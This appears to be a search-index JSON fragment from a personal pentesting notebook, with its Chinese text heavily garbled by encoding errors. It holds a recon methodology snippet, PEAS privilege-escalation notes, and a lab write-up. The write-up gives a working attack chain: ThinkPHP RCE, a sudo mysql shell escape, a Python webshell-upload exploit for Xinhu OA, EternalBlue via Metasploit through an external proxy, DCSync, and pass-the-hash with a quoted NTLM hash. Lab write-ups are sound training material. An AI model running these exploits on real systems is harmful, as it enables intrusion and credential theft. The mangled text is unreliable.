‡å•ä½\u0026ndash;ã€‹å‘ç°åŸŸå\u0026ndash;ã€‹èµ„äº§æµ‹ç»˜å¹³å°ç¬¬ä¸€æ³¢ä¿¡æ¯æ”¶é›†ï¼ˆdomain=\u0026ldquo;qianxin.com\u0026rdquo;ï¼‰\u0026ndash;\u0026gt;å°†è·å–åˆ°çš„IP ç«¯\nå£ä¿¡æ¯ç”¨äºURLæ¢æµ‹ã€æŒ‡çº¹è¯†åˆ«ã€æœåŠ¡è¯†åˆ«\nresultï¼šè·å–åˆ°åŸºäºIPï¼športçš„åº”ç”¨æŒ‡çº¹ä¿¡æ¯ ä»¥åŠåŸºäºURLçš„å„ç§ç½‘é¡µé“¾æ¥åŠå…¶WEBæŒ‡çº¹ä¿¡æ¯\nç¬¬äºŒè½® åŸŸå\u0026ndash;\u0026gt;oneforallã€subfinderã€arlã€ez é€šè¿‡VPSæˆ–å…¶ä»–ä¸»æœºè¿›è¡ŒæŒ‚æœºæ‰«æ è·å–ç›®æ ‡å­åŸŸå\nï¼ˆå»ºè®®VPSæˆ–todeskè¿œæ§å…¶ä»–ä¸»æœºè¿›è¡Œè¯¥æ“ä½œï¼Œç¬¬äºŒè½®å’Œç¬¬ä¸€è½®çš„IPæœ€å¥½åŒºåˆ†å¼€ï¼Œç¬¬ä¸€è½®æ˜¯è‡ªå·±çš„ç‰©ç†\næœºï¼Œå¾ˆå¤šæ“ä½œå¯èƒ½å¯¼è‡´å·²ç»è¢«å°IPäº†ï¼Œæ‰€ä»¥ç¬¬äºŒè½®é€šè¿‡å¦ä¸€ä¸ªIPæˆ–è€…ä»£ç†æ± ï¼Œå¯ä»¥å‘ç°æ˜¯å¦å‡ºç°äº†è¢«å°IP\nçš„é—®é¢˜ï¼Œè¿™æ ·èƒ½æ”¶é›†åˆ°æ›´å¤šå¯èƒ½å› ä¸ºè¢«å°IPè€Œæ¼æ‰çš„æŒ‡çº¹ä¿¡æ¯æˆ–è€…æ¼æ´ï¼‰\nå°†ç¬¬ä¸€è½®çš„ç»“æœè¿›è¡Œæ¼æ´åˆ©ç”¨ï¼ˆä¹Ÿå»ºè®®ä½¿ç”¨VPSï¼Œä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨å¯ä»¥æ˜¯åŒä¸€å°ï¼Œæ¼æ‰«ä¸è¦ç”¨æœ¬\næœºï¼‰\n"
    }
,
    {
        "title": "æ˜¥ç§‹äº‘å¢ƒ-initial",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/",
        "content": "æ˜¥ç§‹äº‘å¢ƒ-initial flag1 è¿›å…¥ç¯å¢ƒï¼Œå‘ç°80ç«¯å£å¼€å¯ï¼Œçœ‹å›¾æ ‡ç–‘ä¼¼thinkphpï¼ŒæŒ‡çº¹è¯†åˆ«å‘ç°ç¡®å®æ˜¯tp5ï¼š\nä¸€æŠŠæ¢­å“ˆå‘ç°å­˜åœ¨RCEï¼š\nç›´æ¥å†™webshellè¿æ¥ä¸Šçº¿ï¼š\nå½“å‰æƒé™ä¸ºwww-dataï¼š\nå°è¯•æƒé™æå‡ï¼Œä¿¡æ¯æœé›†å‘ç°/usr/bin/mysqlå¯ä»¥æ— å¯†ç sudoï¼š\nçœ‹çœ‹æ€ä¹ˆæ‰“sudoææƒï¼š\nokä¼šäº†ï¼Œç›´æ¥ææƒåˆ°rootï¼š\nsudo /usr/bin/mysql -e \u0026#39;\\! /bin/sh\u0026#39; æŒ‰ç†è¯´è¿™é‡Œåº”è¯¥æ²¡é—®é¢˜çš„ï¼Œç”±äºæ˜¯webshellæ‰€ä»¥ä¸èƒ½è·å–æ–°çš„bashï¼Œæ”¹æˆlsï¼š\nsudo /usr/bin/mysql -e \u0026#39;\\! ls -al /root\u0026#39; flagåœ¨rootä¸­ï¼Œç›´æ¥è¯»ï¼š\nsudo /usr/bin/mysql -e \u0026#39;\\! cat /root/flag\u0026#39; å“¦ï¼Ÿå†æ¥\nsudo /usr/bin/mysql -e \u0026#39;\\! ls /root/flag\u0026#39; è¡Œï¼Œå†è¯»ï¼š\næ‹¿åˆ°flag1ï¼š\nflag{60b53231- flag2 å†…ç½‘ç½‘æ®µä¸ºï¼š172.22.1.0/24ï¼š\nfscanä¼ ä¸Šå»æ‰«æ‰«å†…ç½‘ï¼š\næœ‰å¦‚ä¸‹å…³é”®ä¿¡æ¯ï¼š\n172.22.1.2:DCåŸŸæ§ 172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´ 172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ é‚£ä¹ˆå…ˆä»ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿå…¥æ‰‹å§ï¼Œæ­ä¸ªéš§é“ï¼š\nç„¶åproxifieré…ç½®ç‰©ç†æœºä»£ç†åè®¿é—®ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿï¼š\nå¼±å£ä»¤adminï¼šadmin123ç™»å½•æˆåŠŸ\nè¿™ä¸ªç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„dayï¼ˆè„šæœ¬çš„åŒç›®å½•å†™ä¸€ä¸ªåä¸º1.phpçš„ä¸€å¥è¯æœ¨é©¬ï¼‰ï¼š\nimport requests session = requests.session() url_pre = \u0026#39;http://172.22.1.18/\u0026#39; url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=11\u0026#39; data1 = { \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; } r = session.post(url1, data=data1) r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r+\u0026#39;)}) filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; id = r.json()[\u0026#39;id\u0026#39;] url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; r = session.get(url3) r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) print(r.text) è·å¾—äº†ä¸Šä¼ è·¯å¾„ï¼š\n/upload/2024-11/04_21110473.php è¿æ¥å³å¯ï¼š\nå¼€å¯ç»ˆç«¯å‘ç°æ˜¯systemæƒé™ï¼š\næ‰¾flagï¼Œä¼šååœ¨C:/Users/Administrator/flag/flag02.txtä¸­æ‹¿åˆ°flag2ï¼š\n2ce3-4813-87d4- è®©æˆ‘æ‰“åŸŸæ§äº†hhh\nflag3 å…ˆæ‰“ms17-010ï¼Œæ‰€ä»¥ç»™kaliä¹Ÿé…ç½®proxychainsä»£ç†ï¼š\nsocks5 1.94.63.197 1080 ç„¶åç”¨proxychainså¯åŠ¨msfï¼š\nproxychains msfconsole use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/bind_tcp_uuid set RHOSTS 172.22.1.21 run æˆåŠŸgetshell\nå‰é¢fscanå¯çŸ¥è¿™å°æœºå­æ˜¯enterpriseç”¨æˆ·ï¼Œæ¥ä¸‹æ¥DCSyncæ‰“åŸŸæ§ï¼š\nload kiwi # è°ƒç”¨mimikatzæ¨¡å— kiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit è·å–äº†Administratorçš„å¯†ç hashï¼Œç›´æ¥æ‰“PTHï¼š\næœ€åä½¿ç”¨crackmapexec.pyæ‹¿åˆ°äº†DCçš„shellï¼š\nproxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type C:\\Users\\Administrator\\flag\\flag03\u0026#34; flag3:\ne8f88d0d43d6} æ‹¿ä¸‹\n",
        "summary": "æ˜¥ç§‹äº‘å¢ƒ-initial flag1 è¿›å…¥ç¯å¢ƒï¼Œå‘ç°80ç«¯å£å¼€å¯ï¼Œçœ‹å›¾æ ‡ç–‘ä¼¼thinkphpï¼ŒæŒ‡çº¹è¯†åˆ«å‘ç°ç¡®å®æ˜¯tp5ï¼š\nä¸€æŠŠæ¢­å“ˆå‘ç°å­˜åœ¨RCEï¼š\nç›´æ¥å†™webshellè¿æ¥ä¸Šçº¿ï¼š\nå½“å‰æƒé™ä¸ºwww-dataï¼š\nå°è¯•æƒé™æå‡ï¼Œä¿¡æ¯æœé›†å‘ç°/usr/bin/mysqlå¯ä»¥æ— å¯†ç sudoï¼š\nçœ‹çœ‹æ€ä¹ˆæ‰“sudoææƒï¼š\nokä¼šäº†ï¼Œç›´æ¥ææƒåˆ°rootï¼š\nsudo /usr/bin/mysql -e \u0026#39;\\! /bin/sh\u0026#39; æŒ‰ç†è¯´è¿™é‡Œåº”è¯¥æ²¡é—®é¢˜çš„ï¼Œç”±äºæ˜¯webshellæ‰€ä»¥ä¸èƒ½è·å–æ–°çš„bashï¼Œæ”¹æˆlsï¼š\nsudo /usr/bin/mysql -e \u0026#39;\\! ls -al /root\u0026#39; flagåœ¨rootä¸­ï¼Œç›´æ¥è¯»ï¼š\nsudo /usr/bin/mysql -e \u0026#39;\\! cat /root/flag\u0026#39; å“¦ï¼Ÿå†æ¥\nsudo /usr/bin/mysql -e \u0026#39;\\! ls /root/flag\u0026#39; è¡Œï¼Œå†è¯»ï¼š\næ‹¿åˆ°flag1ï¼š\nflag{60b53231- flag2 å†…ç½‘ç½‘æ®µä¸ºï¼š172.22.1.0/24ï¼š\nfscanä¼ ä¸Šå»æ‰«æ‰«å†…ç½‘ï¼š\næœ‰å¦‚ä¸‹å…³é”®ä¿¡æ¯ï¼š\n172.22.1.2:DCåŸŸæ§ 172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´ 172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ é‚£ä¹ˆå…ˆä»ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿå…¥æ‰‹å§ï¼Œæ­ä¸ªéš§é“ï¼š\nç„¶åproxifieré…ç½®ç‰©ç†æœºä»£ç†åè®¿é—®ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿï¼š\nå¼±å£ä»¤adminï¼šadmin123ç™»å½•æˆåŠŸ\nè¿™ä¸ªç³»ç»Ÿå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„dayï¼ˆè„šæœ¬çš„åŒç›®å½•å†™ä¸€ä¸ªåä¸º1.phpçš„ä¸€å¥è¯æœ¨é©¬ï¼‰ï¼š\nimport requests session = requests.session() url_pre = \u0026#39;http://172.22.1.18/\u0026#39; url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=11\u0026#39; data1 = { \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; } r = session.post(url1, data=data1) r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r+\u0026#39;)}) filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; id = r.json()[\u0026#39;id\u0026#39;] url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; r = session.get(url3) r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) print(r.text) "
    }
,
    {
        "title": "æƒé™æå‡-PEASä½¿ç”¨",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-peas%E4%BD%BF%E7%94%A8/",
        "content": "æƒé™æå‡-PEASä½¿ç”¨ ä¸€ä¸ªç‰›é€¼çš„é’ˆå¯¹æƒé™æå‡çš„å·¥å…·ï¼Œé€‚ç”¨äºWindows/linux/unix*/macOSææƒ\nè¿™äº›å·¥å…·æœç´¢å¯èƒ½çš„æœ¬åœ°æƒé™æå‡è·¯å¾„ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™äº›è·¯å¾„å¹¶å°†å®ƒä»¬ä»¥æ¼‚äº®çš„é¢œè‰²æ‰“å°ç»™æ‚¨ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥è½»æ¾è¯†åˆ«é”™è¯¯é…ç½®\nè¿™é‡Œå¯¹å…¶è¿›è¡Œç®€å•ä»‹ç»ï¼Œè¯¦ç»†ä½¿ç”¨è¯·å‰å¾€githubåœ°å€ï¼šhttps://github.com/carlospolop/PEASS-ng/\nWinPEAS ä»‹ç» ç›´æ¥å‘½ä»¤è¡Œæ‰§è¡Œå³å¯ï¼š\nwinPEASany.exe è¿è¡Œwinpeasèƒ½æœç´¢æ‰€æœ‰å¯èƒ½çš„ææƒè·¯å¾„ï¼Œæ£€æŸ¥çš„ä¿¡æ¯å¦‚ä¸‹\nç³»ç»Ÿä¿¡æ¯ åŸºæœ¬ç³»ç»Ÿä¿¡æ¯ ä½¿ç”¨ Watson æœç´¢æ¼æ´ æšä¸¾ Microsoft æ›´æ–°ä¿¡æ¯ PSã€å®¡è®¡ã€WEF å’Œ LAPS è®¾ç½® LSA ä¿æŠ¤ å‡­æ®ä¿æŠ¤ WDigest ç¼“å­˜çš„ä¿¡ç”¨æ•°é‡ ç¯å¢ƒå˜é‡ äº’è”ç½‘è®¾ç½® å½“å‰é©±åŠ¨å™¨ä¿¡æ¯ æ€æ¯’è½¯ä»¶ Windows Defender UAC é…ç½® NTLM è®¾ç½® æœ¬åœ°ç»„ç­–ç•¥ Applocker é…ç½®å’Œç»•è¿‡å»ºè®® æ‰“å°æœº å‘½åç®¡é“ AMSI ä¾›åº”å•† ç³»ç»Ÿç›‘è§†å™¨ .NET ç‰ˆæœ¬ ç”¨æˆ·ä¿¡æ¯ ç”¨æˆ·ä¿¡æ¯ å½“å‰ä»¤ç‰Œç‰¹æƒ å‰ªè´´æ¿æ–‡æœ¬ å½“å‰ç™»å½•çš„ç”¨æˆ· RDP ä¼šè¯ æ›¾ç»ç™»å½•è¿‡çš„ç”¨æˆ· è‡ªåŠ¨ç™»å½•å‡­æ® ä¸»æ–‡ä»¶å¤¹ å¯†ç ç­–ç•¥ æœ¬åœ°ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ ç™»å½•ä¼šè¯ è¿›ç¨‹ä¿¡æ¯ æœ‰è¶£çš„è¿›ç¨‹ï¼ˆéå¾®è½¯ï¼‰ æœåŠ¡ä¿¡æ¯ æœ‰è¶£çš„æœåŠ¡ï¼ˆé Microsoftï¼‰ä¿¡æ¯ å¯ä¿®æ”¹çš„æœåŠ¡ å¯å†™æœåŠ¡æ³¨å†Œè¡¨binpath PATH DLLåŠ«æŒ åº”ç”¨ä¿¡æ¯ å½“å‰æ´»åŠ¨çª—å£ å®‰è£…çš„è½¯ä»¶ è‡ªåŠ¨è¿è¡Œ è®¡åˆ’ä»»åŠ¡ è®¾å¤‡é©±åŠ¨ç¨‹åº ç½‘ç»œä¿¡æ¯ å½“å‰net share æ˜ å°„é©±åŠ¨å™¨ (WMI) ä¸»æœºæ–‡ä»¶ ç½‘ç»œæ¥å£ ç›‘å¬ç«¯å£ é˜²ç«å¢™è§„åˆ™ DNS ç¼“å­˜ï¼ˆé™åˆ¶ 70ï¼‰ äº’è”ç½‘è®¾ç½® Windows å‡­æ® Windows ä¿é™©åº“ å‡­è¯ç®¡ç†å™¨ ä¿å­˜çš„ RDP è®¾ç½® æœ€è¿‘è¿è¡Œçš„å‘½ä»¤ é»˜è®¤ PS æˆç»©å•æ–‡ä»¶ DPAPI ä¸‡èƒ½å¯†é’¥ DPAPI å‡­æ®æ–‡ä»¶ è¿œç¨‹æ¡Œé¢è¿æ¥ç®¡ç†å™¨å‡­æ® Kerberos é—¨ç¥¨ æ— çº¿ä¸Šç½‘ AppCmd.exe SSClient.exe SCCM å®‰å…¨åŒ…å‡­è¯ AlwaysInstallElevated WSUS æµè§ˆå™¨ä¿¡æ¯ Firefox æ•°æ®åº“ Firefox å†å²ä¸Šçš„å‡­æ® Chrome æ•°æ®åº“ chrome å†å²ä¸Šçš„å‡­æ® å½“å‰çš„ IE é€‰é¡¹å¡ IEå†å²ä¸Šçš„å‡­æ® IE æ”¶è—å¤¹ æå–å·²ä¿å­˜çš„å¯†ç ï¼šFirefoxã€Chromeã€Operaã€Brave æœ‰è¶£çš„æ–‡ä»¶å’Œæ³¨å†Œè¡¨ Puttyä¼šè¯ Putty SSH ä¸»æœºå¯†é’¥ SuperPuttyä¿¡æ¯ OneDrive åŒæ­¥çš„ Office365 ç«¯ç‚¹ æ³¨å†Œè¡¨ä¸­çš„ SSH å¯†é’¥ äº‘å‡­è¯ æ£€æŸ¥æ— äººå‚ä¸çš„æ–‡ä»¶ æ£€æŸ¥ SAM å’Œ SYSTEM å¤‡ä»½ æ£€æŸ¥ç¼“å­˜çš„ GPP å¯†ç  ä» McAffe SiteList.xml æ–‡ä»¶ä¸­æ£€æŸ¥å¹¶æå–å‡­æ® å¯èƒ½çš„å…·æœ‰å‡­æ®çš„æ³¨å†Œè¡¨ ç”¨æˆ·å®¶ä¸­å¯èƒ½çš„å‡­æ®æ–‡ä»¶ å›æ”¶ç«™ä¸­å¯èƒ½å­˜åœ¨çš„å¯†ç æ–‡ä»¶ å¯èƒ½åŒ…å«å‡­æ®çš„æ–‡ä»¶ï¼ˆè¿™éœ€è¦å‡ åˆ†é’Ÿï¼‰ ç”¨æˆ·æ–‡ä»¶ï¼ˆé™åˆ¶ 100 ä¸ªï¼‰ Oracle SQL Developer é…ç½®æ–‡ä»¶æ£€æŸ¥ Slackæ–‡ä»¶æœç´¢ Outlook ä¸‹è½½ æœºå™¨å’Œç”¨æˆ·è¯ä¹¦æ–‡ä»¶ Officeæœ€è¿‘çš„æ–‡ä»¶ éšè—çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ å…·æœ‰å†™å…¥æƒé™çš„éé»˜è®¤æ–‡ä»¶å¤¹ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ WSL æ£€æŸ¥ æ´»åŠ¨ä¿¡æ¯ ç™»å½• + æ˜¾å¼ç™»å½•äº‹ä»¶ æµç¨‹åˆ›å»ºäº‹ä»¶ PowerShell äº‹ä»¶ ç”µæºå¼€/å…³äº‹ä»¶ é™„åŠ ï¼ˆè¾ƒæ…¢ï¼‰æ£€æŸ¥ LOLBAS æœç´¢ åœ¨é»˜è®¤ WSL åˆ†å‘ä¸­è¿è¡Œ**linpeas.sh** å‚æ•°è®¾ç½® -hå¯ä»¥æŸ¥çœ‹æ‰€æœ‰å‚æ•°ï¼š\n[*] WinPEASæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®ƒåˆ—ä¸¾äº†æœ¬åœ°å‡çº§ç‰¹æƒçš„å¯èƒ½è·¯å¾„ quiet ä¸è¦æ‰“å°æ¨ªå¹… notcolor ä¸è¦ä½¿ç”¨ansié¢œè‰²(å…¨ç™½) domain åˆ—ä¸¾åŸŸä¿¡æ¯ systeminfo æœç´¢ç³»ç»Ÿä¿¡æ¯ userinfo æœç´¢ç”¨æˆ·ä¿¡æ¯ processinfo æœç´¢å¤„ç†ä¿¡æ¯ servicesinfo æœç´¢æœåŠ¡ä¿¡æ¯ applicationsinfo æœç´¢å·²å®‰è£…åº”ç”¨ç¨‹åºä¿¡æ¯ networkinfo æœç´¢ç½‘ç»œä¿¡æ¯ windowscreds æœç´¢windowsçš„å‡­è¯ browserinfo æœç´¢æµè§ˆå™¨ä¿¡æ¯ filesinfo æœç´¢å¯ä»¥åŒ…å«å‡­æ®çš„é€šç”¨æ–‡ä»¶ fileanalysis æœç´¢å¯èƒ½åŒ…å«å‡­æ®çš„ç‰¹å®šæ–‡ä»¶ eventsinfo æ˜¾ç¤ºæ„Ÿå…´è¶£çš„äº‹ä»¶ä¿¡æ¯ wait åœ¨ä¸¤æ¬¡æ£€æŸ¥ä¹‹é—´ç­‰å¾…ç”¨æˆ·è¾“å…¥ debug æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯-å†…å­˜ä½¿ç”¨ï¼Œæ–¹æ³•æ‰§è¡Œæ—¶é—´ log[=logfile] å°†æ‰€æœ‰è¾“å‡ºè®°å½•åˆ°å®šä¹‰ä¸ºlogfileçš„æ–‡ä»¶ä¸­ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™è®°å½•åˆ°\u0026#34;out.txt\u0026#34; é¢å¤–çš„æ£€æŸ¥(æ…¢): -lolbas è¿è¡Œé¢å¤–çš„LOLBASæ£€æŸ¥ -linpeas=[url] è¿è¡Œé¢å¤–çš„linpeasen.shæ£€æŸ¥é»˜è®¤çš„WSLåˆ†å‘ï¼Œå¯é€‰åœ°æä¾›è‡ªå®šä¹‰linpeasen.sh URL (é»˜è®¤: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) LinPEAS ä»‹ç» LinPEASèƒ½æœç´¢å¯èƒ½çš„æƒé™æå‡è·¯å¾„ï¼ˆåœ¨ Debianã€CentOSã€FreeBSDã€OpenBSD å’Œ MacOS ä¸­æµ‹è¯•ï¼‰\nè¿™ä¸ªè„šæœ¬æ²¡æœ‰ä»»ä½•ä¾èµ–ã€‚\nå®ƒä½¿ç”¨**/bin/sh**è¯­æ³•ï¼Œå› æ­¤å¯ä»¥åœ¨ä»»ä½•æ”¯æŒshï¼ˆä»¥åŠä½¿ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œå‚æ•°ï¼‰ä¸­è¿è¡Œã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œlinpeas ä¸ä¼šå‘ç£ç›˜å†™å…¥ä»»ä½•å†…å®¹ï¼Œä¹Ÿä¸ä¼šå°è¯•ä»¥ä»»ä½•å…¶ä»–ç”¨æˆ·èº«ä»½ä½¿ç”¨su.\nä½¿ç”¨å‰èµ‹äºˆä¸€ä¸‹æ‰§è¡Œæƒé™ï¼š\nchmod+x linpeas.sh ./linpeas.sh -h LinPEAS ä½¿ç”¨é¢œè‰²æ¥æŒ‡ç¤ºæ¯ä¸ªéƒ¨åˆ†çš„å¼€å§‹ä½ç½®ï¼Œä¹Ÿç”¨æ¥è¯†åˆ«æ½œåœ¨çš„é”™è¯¯é…ç½®\nçº¢è‰²/é»„è‰²ç”¨äºè¯†åˆ«å¯¼è‡´ PE çš„é…ç½®ï¼ˆ99% è‚¯å®šï¼‰\nçº¢è‰²ç”¨äºè¯†åˆ«å¯èƒ½å¯¼è‡´ PE çš„å¯ç–‘é…ç½®ï¼š\nå¯èƒ½çš„å¯åˆ©ç”¨å†…æ ¸ç‰ˆæœ¬ æ˜“å—æ”»å‡»çš„ sudo ç‰ˆæœ¬ è¯†åˆ«ä»¥ root èº«ä»½è¿è¡Œçš„è¿›ç¨‹ æœªå®‰è£…çš„è®¾å¤‡ å±é™©çš„ fstab æƒé™ æœ‰è¶£ç›®å½•ä¸­çš„å¯å†™æ–‡ä»¶ å…·æœ‰æŸäº›æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„ SUID/SGID äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå®ƒè¿˜æŒ‡å®šæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ï¼‰ å¯ç”¨äºåœ¨ sudo -lï¼ˆæ— å¯†ç ï¼‰ä¸­æå‡æƒé™çš„ SUDO äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆhttps://gtfobins.github.io/ï¼‰ æ£€æŸ¥ /etc/doas.conf ç½‘ç»œç»Ÿè®¡ä¸­çš„ 127.0.0.1 å¯èƒ½åŒ…å«å¯†ç çš„å·²çŸ¥æ–‡ä»¶ æœ‰è¶£çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„åŠŸèƒ½ äºŒè¿›åˆ¶æ–‡ä»¶çš„æœ‰è¶£åŠŸèƒ½ æœ‰å…³ cron ä½œä¸šçš„ä¿¡æ¯ä¸­çš„å¯å†™æ–‡ä»¶å¤¹å’Œé€šé…ç¬¦ PATH ä¸­çš„å¯å†™æ–‡ä»¶å¤¹ å¯èƒ½å¯¼è‡´rootçš„ç»„ å¯èƒ½åŒ…å«å¯†ç çš„æ–‡ä»¶ å¯ç–‘çš„ cronjobs ç»¿è‰²ç”¨äºï¼š\nç”± root è¿è¡Œçš„å¸¸ç”¨è¿›ç¨‹ å®‰è£…å¸¸è§çš„ä¸æ„Ÿå…´è¶£çš„è®¾å¤‡ ä¸å±é™©çš„ fstab æƒé™ SUID/SGID é€šç”¨äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆè¯¥ bin å·²åœ¨å…¶ä»–æœºå™¨ä¸­æ‰¾åˆ°ï¼Œå¹¶ä¸” searchsploit æœªè¯†åˆ«ä»»ä½•æ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ï¼‰ è·¯å¾„ä¸­çš„å¸¸è§ .sh æ–‡ä»¶ æ‰§è¡Œè¿›ç¨‹çš„ç”¨æˆ·çš„é€šç”¨åç§° å¸¸è§çš„ cronjobs è“è‰²ç”¨äºï¼š\næ²¡æœ‰shellçš„ç”¨æˆ· å®‰è£…è®¾å¤‡ æµ…é’è‰²ç”¨äºï¼š\næœ‰shellçš„ç”¨æˆ· æµ…æ´‹çº¢è‰²ç”¨äºï¼š\nå½“å‰ç”¨æˆ·å å‚æ•°è®¾ç½® å‚æ•°å¦‚ä¸‹ï¼š\nè¯¥å·¥å…·å°†æšä¸¾å¹¶æœç´¢ä¸»æœºå†…éƒ¨å¯èƒ½çš„é”™è¯¯é…ç½®(å·²çŸ¥çš„vulnsã€ç”¨æˆ·ã€è¿›ç¨‹å’Œæ–‡ä»¶æƒé™ã€ç‰¹æ®Šæ–‡ä»¶æƒé™ã€å¯è¯»/å¯å†™æ–‡ä»¶ã€æš´åŠ›ç ´è§£å…¶ä»–ç”¨æˆ·(top1000pwds)ã€å¯†ç â€¦â€¦)ï¼Œå¹¶ç”¨é¢œè‰²çªå‡ºæ˜¾ç¤ºå¯èƒ½çš„é”™è¯¯é…ç½®ã€‚ -h æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯ -q ä¸æ˜¾ç¤ºæ¨ªå¹… -e æ‰§è¡Œé¢å¤–çš„æšä¸¾ -s è¶…å¿«(ä¸æ£€æŸ¥ä¸€äº›è€—æ—¶çš„æ£€æŸ¥)-æ½œè¡Œæ¨¡å¼ -a æ‰€æœ‰æ£€æŸ¥(1åˆ†é’Ÿçš„è¿›ç¨‹å’Œsu)â€”â€”å™ªå£°æ¨¡å¼ï¼Œä¸»è¦ç”¨äºCTFs -w åœ¨å¤§å—æ£€æŸ¥ä¹‹é—´ç­‰å¾…æ‰§è¡Œ -N ä¸è¦ä½¿ç”¨é¢œè‰² -D è°ƒè¯•æ¨¡å¼ -P æŒ‡å®šç”¨äºè¿è¡Œ\u0026#39;sudo -l\u0026#39;å’Œé€šè¿‡\u0026#39;su\u0026#39;å¼ºåˆ¶å…¶ä»–ç”¨æˆ·å¸æˆ·çš„å¯†ç  -o åªæ‰§è¡Œé€‰å®šçš„æ£€æŸ¥(system_informationã€containerã€procs_crons_timers_srvcs_socketsã€network_informationã€users_informationã€software_informationã€interesting_files)ã€‚é€‰æ‹©é€—å·åˆ†éš”çš„åˆ—è¡¨ã€‚ -L å¼ºåˆ¶linpeasæ‰§è¡Œã€‚ -M å¼ºåˆ¶macpeasæ‰§è¡Œã€‚ -d \u0026lt;ip 